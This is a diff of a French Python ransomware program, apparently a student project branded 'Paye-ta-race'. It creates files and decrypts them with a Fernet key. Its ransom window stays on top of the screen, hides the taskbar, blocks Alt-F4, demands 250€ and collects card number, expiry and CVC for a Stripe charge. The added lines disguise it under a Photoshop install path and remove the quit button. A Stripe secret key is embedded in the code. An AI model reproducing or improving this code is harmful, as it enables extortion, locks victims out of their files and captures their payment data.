@@ -1,9 +1,3 @@
-# Style de la console
-from art import *
-from termcolor import colored
-print(colored (text2art("Paye-ta-race").center(60),'green'))
-print(colored("ransomeware created by our network, Need4School".center(50),'cyan'))
-
 # Création des fichiers de l'utilisateur que nous
 import os
 def create_dir(directory):
@@ -16,12 +10,12 @@ def write_file(path,data):
     file.write(data)
     return file
 def remplir_repertoire(dir):
-    with open(str(dir)+'/'+'file1.txt','w') as file :
-        file.write("Ce contenu est très important...")
-        file.write("les informations de nos chers clients...")
-    with open(str(dir)+'/'+'file2.txt','w') as file :
-        file.write("Ce contenu est très important...")
-        file.write("les informations de nos chers clients...")
+    with open(str(dir)+'/'+'quoicoubeh.txt','w') as file :
+        file.write("Pourquoi les crampté ne jouent-ils jamais avec les quoicoubeh ?")
+        file.write("Parce qu'ils finissent toujours par se prendre les pieds dans les tentacules des quoicoubeh !")
+    with open(str(dir)+'/'+'LaBlagueDuPlongeur.txt','w') as file :
+        file.write("Pourquoi est-ce que les plongeurs plongent toujours en arrière et jamais en avant ?")
+        file.write("Parce que sinon, ils tombent dans le bateau !")
 pwd=create_dir('files')
 remplir_repertoire(pwd)
 
@@ -51,53 +45,53 @@ with open(str(pwd) + '/' + 'readme.txt','w') as file :
 
 # Affichage de l'app
 import tkinter as tk
+from tkinter import *
 import tkinter.font as tkFont
 
 class App:
     def __init__(self, root):
         #Titre
-        root.title("undefined")
+        root.title("PTR")
         #Taille de la fenêtre de l'application
-        width=600
-        height=500
+        width=400
+        height=600
         screenwidth = root.winfo_screenwidth()
         screenheight = root.winfo_screenheight()
         alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
         root.geometry(alignstr)
         root.resizable(width=False, height=False)
+        root.wm_attributes("-topmost", 1)
 
-        # # Signale sonore
-        # import time
-        # import winsound
-        # # Set frequency to 2000 Hertz
-        # frequency = 600
-        # # Set duration to 1500 milliseconds (1.5 seconds)
-        # duration = 300
-
-        # var1=True
-
-        # while var1:
-        #     # Make beep sound on Windows
-        #     winsound.Beep(frequency, duration)
-        #     time.sleep(2)
+        import sys
+        sys.path.append('data')
 
         # Système de paiement
         import stripe
 
         stripe.api_key = 'sk_test_51MP4JIDouJcaqTebvs7JBZQetAWVyGdP1vJUQZSbQpAhXFnnYMLDgnNWobC82UW6eluRtVpoWUek1pqfjShSSgQo00xtqqT251'
 
+        # Création du titre
+        title_label = tk.Label(root, text="§\ PAS DE CHANCE /§", font=("Arial", 20))
+        title_label.pack(pady=20)
+
+        # Création du paragraphe
+        text_label = tk.Label(root, text="Vous venez de vous faire harponner par un malware. Vos documents ont été cryptés et sont maintenant inutilisable, le seul moyen de pouvoir de nouveau les utiliser et des payer la modique somme de 250€ La prochaine fois, vous ferez plus attention en vous baladant sur le net.", font=("Arial", 12), wraplength=300, justify="center")
+        text_label.pack(padx=30, pady=30)
+
         # Création des éléments d'interface utilisateur Tkinter
-        tk.Label(root, text="Numéro de carte").grid(row=0, column=0)
+        tk.Label(root, text="Numéro de carte").place(relx=0.5, rely=0.56, anchor=CENTER)
         card_number = tk.Entry(root)
-        card_number.grid(row=0, column=1)
+        card_number.place(relx=0.5, rely=0.59, anchor=CENTER)
 
-        tk.Label(root, text="Date d'expiration (MM/AA)").grid(row=1, column=0)
+        tk.Label(root, text="Date d'expiration (MM/AA)").place(relx=0.5, rely=0.64, anchor=CENTER)
         expiration_date = tk.Entry(root)
-        expiration_date.grid(row=1, column=1)
+        expiration_date.place(relx=0.5, rely=0.67, anchor=CENTER)
 
-        tk.Label(root, text="Code de sécurité").grid(row=2, column=0)
+        tk.Label(root, text="Code de sécurité").place(relx=0.5, rely=0.72, anchor=CENTER)
         cvc = tk.Entry(root)
-        cvc.grid(row=2, column=1)
+        cvc.place(relx=0.5, rely=0.75, anchor=CENTER)
+
+        
 
         def process_payment():
             # Récupération des informations de paiement saisies par l'utilisateur
@@ -117,7 +111,7 @@ class App:
 
             # Utilisation du token de test pour créer une charge
             charge = stripe.Charge.create(
-                amount=100000,
+                amount=25000,
                 currency='eur',
                 source=token['id'],
                 description='Paiement en ligne'
@@ -127,7 +121,7 @@ class App:
             print(charge["status"])
             if charge["status"] == "succeeded":
 
-                # Décriptage des fichiers en utilisant la clé
+                # Fonction de décryptage des fichiers en utilisant la clé
                 def decrypt(items, clef):
                     f=Fernet(clef)
                     for item in items:
@@ -140,53 +134,45 @@ class App:
                     return open('clef.key','rb').read()
                 clef=lire_clef()
 
-                # Suppression de la clé et du readme
-                path="C:/xampp/htdocs/Photoshop.exe/files"
-                # os.remove(path + '/' + 'file1.txt')
-                # os.remove(path + '/' + 'file2.txt')
+                # Suppression de la clé et du readme + décryptage
+                path="C:/Program Files (x86)/Photoshop/files"
                 os.remove(path + '/' + 'readme.txt')
                 items=os.listdir(path)
                 chemin=[path + '/' + item for item in items]
                 decrypt(chemin,clef)
-                path="C:/xampp/htdocs/Photoshop.exe"
+                path="C:/Program Files (x86)/Photoshop"
                 os.remove(path + '/' + 'clef.key')
-                root.destroy()
 
-                # Exécuter un script Python
-                os.system('python script.py')
+                # Fermeture le l'app
+                root.destroy()
                 
 
+
         # Création du bouton de paiement
-        tk.Button(root, text="Payer", command=process_payment).grid(row=3, column=0, columnspan=2)
-
-        # définit la fonction pour fermer la fenêtre
-        def quitter():
-            root.destroy()
-
-        # Création du bouton exite
-        tk.Button(root, text="Quitter", command=quitter).grid(row=18, column=0, columnspan=2)
+        tk.Button(root, text="Payer", command=process_payment).place(relx=0.5, rely=0.82, anchor=CENTER)
 
         #Cache la barre d'aplication windows
         root.overrideredirect(True)
 
         #Empèche alt + F4
-        pressed_f4 = False  # Is Alt-F4 pressed?
+        pressed_f4 = False
 
         def do_exit():
             global pressed_f4
             print('Trying to close application')
-            if pressed_f4:  # Deny if Alt-F4 is pressed
+            if pressed_f4:
                 print('Denied!')
-                pressed_f4 = False  # Reset variable
+                pressed_f4 = False 
             else:
-                close()     # Exit application
+                close()  
 
-        def alt_f4(event):  # Alt-F4 is pressed
+        # Si l'utilisateur appuie sur Alt-F4
+        def alt_f4(event):  
             global pressed_f4
             print('Alt-F4 pressed')
             pressed_f4 = True
 
-        def close(*event):  # Exit application
+        def close(event):
             root.destroy()
 
         root.bind('<Alt-F4>', alt_f4)
@@ -200,6 +186,3 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = App(root)
     root.mainloop()
-
-path="C:/xampp/htdocs"
-os.remove(path + '/' + 'Photoshop.exe')
